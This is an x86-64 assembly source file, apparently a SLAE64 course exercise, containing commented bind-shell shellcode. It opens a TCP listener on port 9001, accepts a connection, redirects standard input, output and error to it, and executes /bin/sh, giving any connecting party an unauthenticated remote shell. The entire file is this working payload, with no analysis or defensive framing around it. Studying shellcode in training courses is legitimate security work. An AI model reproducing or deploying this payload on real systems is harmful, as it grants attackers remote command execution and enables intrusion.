; Filename: bind.nasm
; Author: SLAE64-14209

global _start

section .text

_start:

      push byte +0x29              ; = 41
      pop rax                      ; syscall = socket()
      cdq                          ; RDX = 0
      push byte +0x2               ; 
      pop rdi                      ; AF_INET = 2
      push byte +0x1               ; 
      pop rsi                      ; SOCKET_STREAM = 1
      syscall                      ; executing syscall socket()
      xchg rax, rdi                ; saving results for later use
      push rdx                     ; 
      mov dword [rsp], 0x29230002  ; Doubleword = 1. port = 9001 (0x2923) 2. AF_INET = 2 (0x02)
      mov rsi, rsp                 ; move dword -> RSI
      push byte +0x10              ; address length into RDX
      pop rdx
      push byte +0x31              ; = 49
      pop rax                      ; syscall = bind()
      syscall                      ; executing syscall bind()
      push byte +0x32              ; = 50
      pop rax                      ; syscall listen()
      syscall                      ; executing syscall listen()
      xor rsi, rsi                 ; RSI = 0
      push byte +0x2b              ; = 43
      pop rax                      ; syscall = accept()
      syscall                      ; executing syscall accept()
      xchg rax, rdi                ; saving results for later use
      push byte +0x3
      pop rsi                      ; RSI loop = 3
      dec rsi                      ; RSI minus 1 <-------<-----------<-----------<-----------<-------------<-----|
      push byte +0x21              ; = 33                                                                        |
      pop rax                      ; syscall dup2()                                                              |
      syscall                      ; executing syscall dup2()                                                    |
      jnz 0x27                     ; JNE -> loop to instruction dec rsi (redirects STDERR, STDOUT and STDIN -->->| 
      push byte +0x3b              ; = 59
      pop rax                      ; syscall execve()
      cdq
      mov rbx, 0x68732f6e69622f    ; "hs/nib/"
      push rbx                     ; 
      mov rdi, rsp                 ; RSI -> RDI -> pathname = /bin/sh,0x0  
      push rdx                     ; RDX = 0
      push rdi
      mov rsi, rsp
      syscall                      ; executing syscall execve()
